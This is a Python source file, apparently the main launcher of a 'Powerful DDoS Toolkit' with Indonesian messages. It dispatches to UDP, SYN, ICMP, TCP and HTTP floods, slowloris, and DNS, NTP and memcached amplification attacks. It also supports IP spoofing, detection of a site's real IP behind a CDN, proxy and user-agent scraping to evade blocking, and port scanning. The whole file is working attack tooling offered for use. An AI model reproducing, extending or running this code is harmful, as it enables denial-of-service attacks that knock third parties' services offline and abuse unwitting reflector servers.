#!/usr/bin/env python3
import argparse
import os
import sys
import time

from attacks import (
    udp_flood,
    syn_flood,
    icmp_flood,
    tcp_flood,
    http_flood,
    slowloris,
    dns_amp,
    ntp_amp,
    memcached_amp,
)
from core.real_ip import detect_real_ip
from core.proxy_scraper import scrape_proxies, scrape_user_agents

def load_memcached_servers():
    script_dir = os.path.dirname(os.path.abspath(__file__))
    ip_file = os.path.join(script_dir, "all-ipv4-ClassC-192,168", "all_ip.txt")
    if not os.path.exists(ip_file):
        print(f"[!] File tidak ditemukan: {ip_file}")
        return None
    servers = []
    with open(ip_file, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if line:
                servers.append(line)
    print(f"[+] Loaded {len(servers)} server IPs from {ip_file}")
    return servers

def load_proxies(filepath):
    if not filepath:
        filepath = "proxy.txt"
    if not os.path.exists(filepath):
        return []
    proxies = []
    with open(filepath, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#"):
                proxies.append(line)
    return proxies

def load_user_agents(filepath):
    if not filepath:
        filepath = "ua.txt"
    if not os.path.exists(filepath):
        return []
    with open(filepath, "r", encoding="utf-8") as f:
        content = f.read().strip()
    lines = [ln.strip() for ln in content.splitlines() if ln.strip() and not ln.startswith("#")]
    return lines

def run_port_scan(target):
    """Run port scanner from port_scan_attack.py then optionally launch attack."""
    try:
        import port_scan_attack
        # Override sys.argv for port_scan_attack main
        sys.argv = ["port_scan_attack.py", target]
        port_scan_attack.main()
    except ImportError:
        print("[!] port_scan_attack.py tidak ditemukan di folder yang sama.")
        print("[!] Pastikan file tersebut ada di root ddos_toolkit/.")
        sys.exit(1)
    except SystemExit:
        pass

def main():
    parser = argparse.ArgumentParser(description="Powerful DDoS Toolkit with Proxy Scraper and Port Scanner")
    parser.add_argument("--target", help="Target IP or domain")
    parser.add_argument("--port", type=int, default=80, help="Target port")
    parser.add_argument("--method",
                        choices=["udp", "syn", "http", "slowloris", "dns", "ntp", "memcached", "icmp", "tcp"],
                        help="Attack method")
    parser.add_argument("--threads", type=int, default=100, help="Number of threads")
    parser.add_argument("--duration", type=int, default=60, help="Duration in seconds")
    parser.add_argument("--spoof", action="store_true", help="Enable IP spoofing (requires root)")
    parser.add_argument("--real-ip", action="store_true", help="Detect real IP behind CDN")

    # Proxy / UA Scraper
    parser.add_argument("--scrape-proxies", action="store_true", help="Scrape proxies lalu keluar")
    parser.add_argument("--scrape-ua", action="store_true", help="Scrape user-agents lalu keluar")
    parser.add_argument("--proxy", action="store_true", help="Gunakan proxy dari proxy.txt untuk HTTP/Slowloris")
    parser.add_argument("--proxy-file", type=str, help="File proxy custom")
    parser.add_argument("--ua-file", type=str, help="File user-agent custom untuk HTTP flood")

    # Port Scanner
    parser.add_argument("--scan", action="store_true", help="Jalankan port scanner terhadap target")

    args = parser.parse_args()

    # Mode scraper
    if args.scrape_proxies:
        proxies = scrape_proxies()
        print(f"[+] Scraping selesai. Total proxy unik: {len(proxies)}")
        print("[+] Disimpan ke proxy.txt dan proxt.txt")
        return
    if args.scrape_ua:
        ua = scrape_user_agents()
        print(f"[+] Scraping user-agent selesai. Panjang data: {len(ua)} karakter")
        print("[+] Disimpan ke ua.txt")
        return

    # Mode port scanner
    if args.scan:
        if not args.target:
            parser.error("--target wajib diisi untuk mode --scan")
        run_port_scan(args.target)
        return

    if not args.target or not args.method:
        parser.error("--target dan --method wajib diisi (kecuali mode scraper/scan)")

    target = args.target
    if args.real_ip:
        real = detect_real_ip(target)
        if real:
            print(f"[+] Real IP detected: {real}")
            target = real
        else:
            print("[!] Real IP not found, using original target")

    print(f"[*] Starting {args.method.upper()} flood on {target}:{args.port}")
    print(f"[*] Threads: {args.threads}, Duration: {args.duration}s, Spoof: {args.spoof}")

    # Load proxies jika diminta
    proxies = []
    if args.proxy or args.proxy_file:
        proxies = load_proxies(args.proxy_file)
        if not proxies:
            print("[!] Tidak ada proxy ditemukan. Jalankan --scrape-proxies dulu.")
            sys.exit(1)
        print(f"[+] Loaded {len(proxies)} proxies")

    # Load user agents jika ada
    user_agents = []
    if args.ua_file:
        user_agents = load_user_agents(args.ua_file)
        if user_agents:
            print(f"[+] Loaded {len(user_agents)} user-agents")
        else:
            print("[!] File UA tidak ditemukan/kosong. Menggunakan UA default.")

    method_map = {
        "udp": udp_flood.attack,
        "syn": syn_flood.attack,
        "icmp": icmp_flood.attack,
        "tcp": tcp_flood.attack,
        "dns": dns_amp.attack,
        "ntp": ntp_amp.attack,
    }

    try:
        if args.method == "memcached":
            servers = load_memcached_servers()
            if not servers:
                print("[!] Gagal memuat all_ip.txt")
                sys.exit(1)
            memcached_amp.attack(target, args.port, args.threads, args.duration, args.spoof, servers)
        elif args.method == "http":
            http_flood.attack(target, args.port, args.threads, args.duration, args.spoof,
                              proxies=proxies, user_agents=user_agents)
        elif args.method == "slowloris":
            slowloris.attack(target, args.port, args.threads, args.duration, args.spoof,
                             proxies=proxies)
        else:
            method_map[args.method](target, args.port, args.threads, args.duration, args.spoof)
    except KeyboardInterrupt:
        print("\n[!] Attack stopped")
    except PermissionError:
        print("[!] Root/Admin privileges required for raw socket attacks")

if __name__ == "__main__":
    main()
